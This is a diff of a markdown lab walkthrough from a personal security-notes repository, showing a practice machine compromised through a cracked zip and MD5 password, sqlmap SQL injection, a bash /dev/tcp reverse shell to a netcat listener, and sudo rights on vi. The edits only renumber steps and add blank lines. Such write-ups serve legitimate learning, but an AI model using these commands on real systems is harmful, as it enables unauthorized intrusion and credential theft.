@@ -37,6 +37,7 @@ ftp {target_machine_ip}
 ### What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?
 
 1. We try to unzip the backup.zip however a password is required.
+   
    ![Screenshot 2024-02-20 at 12 00 57 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/ae3c46ff-0939-4956-8cc9-8d8c92440424)
 
 
@@ -65,6 +66,7 @@ ftp {target_machine_ip}
    ```bash
    unzip backup.zip
    ```
+   
 ![Screenshot 2024-02-20 at 11 10 22 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/d214ebb6-65ae-4578-ab97-ad4f922a922b)
 
 4. Now let's investigate the index.php `vim index.php`. Here we find a hashed password `2cb42f8734ea607eefed3b70af13bbd3` for the username `admin`. 
@@ -90,11 +92,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 admin-hash.txt
 
 1. Login using username `admin` and password `qwerty789`
 2. Go to browser and get the cookie `PHPSESSID` value
+
 ![Screenshot 2024-02-22 at 12 45 40 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/9954818a-ad05-4789-9292-8b6e202e1b8a)
 
 
 
 3. Next as we view with the page after we login, we can see one possible form to attack with SQL injection. We observe that submitting it appends a query parameter `search`
+   
 ![Screenshot 2024-02-22 at 12 49 49 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/6f874149-cb51-4d73-81a8-488be978f271)
 
 4. Let's use sqlmap and run the following.
@@ -109,42 +113,44 @@ sqlmap -u "http://{target_ip}/dashboard.php?search=test" --cookie="PHPSESSID={co
 
 ![Screenshot 2024-02-22 at 12 56 35 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/508193c6-850c-405d-89c9-8c13377c2e08)
 
-5. Let's go to our attack machine and create a netcat listner server
+6. Let's go to our attack machine and create a netcat listner server
 
 ```bash
   nc -lvnp 5000
 ```
 
-6. On our target machine running sqlmap os-shell let's connect to our server to spawn a reverse shell.
+7. On our target machine running sqlmap os-shell let's connect to our server to spawn a reverse shell.
 
 ```bash
  bash -c  "bash -i >& /dev/tcp/{attack_machine_ip}/5000  0>&1"
 
 ```
 
-7. We have spawned a reverse shell however we do not have an interactive shell yet.
+8. We have spawned a reverse shell however we do not have an interactive shell yet.
+   
 ![Screenshot 2024-02-22 at 1 11 58 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/e4502837-7e73-4692-8d16-6c07b0d3aae5)
 
-8. Run the following to have an interactive shell. 
+9. Run the following to have an interactive shell. 
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 stty raw -echo
 export TERM=xterm
 ```
 
-9. We now have an interactive shell. Hovever we have to know the password of user `postgres` to run `sudo -l`
+10. We now have an interactive shell. Hovever we have to know the password of user `postgres` to run `sudo -l`
     
 ![Screenshot 2024-02-22 at 2 00 25 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/f39b4b0a-70c7-45ab-954f-325620f72896)
 
-10. We have to find the password in the system. And since this server running a website, one of the places we can look at is `/var/www/`
+11. We have to find the password in the system. And since this server running a website, one of the places we can look at is `/var/www/`
+    
 ![Screenshot 2024-02-22 at 2 26 14 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/60fdfdc5-b94d-487a-8b70-c05438972859)
 
-11. Let's explore each of the files in the `html` folder. Under the `dashboard.php` file we find. 
+12. Let's explore each of the files in the `html` folder. Under the `dashboard.php` file we find. 
 
 ![Screenshot 2024-02-22 at 2 32 15 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/2582d9ed-becf-4bd2-be03-eb392cde88b0)
 
 
-12. We test this password by using it for the password prompt for `sudo -l` Where we find that we have sudo rights for vi program.
+13. We test this password by using it for the password prompt for `sudo -l` Where we find that we have sudo rights for vi program.
 
 ![Screenshot 2024-02-22 at 2 10 53 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/752994b0-6b2d-4cf4-9aa4-9fa83b68a295)
 
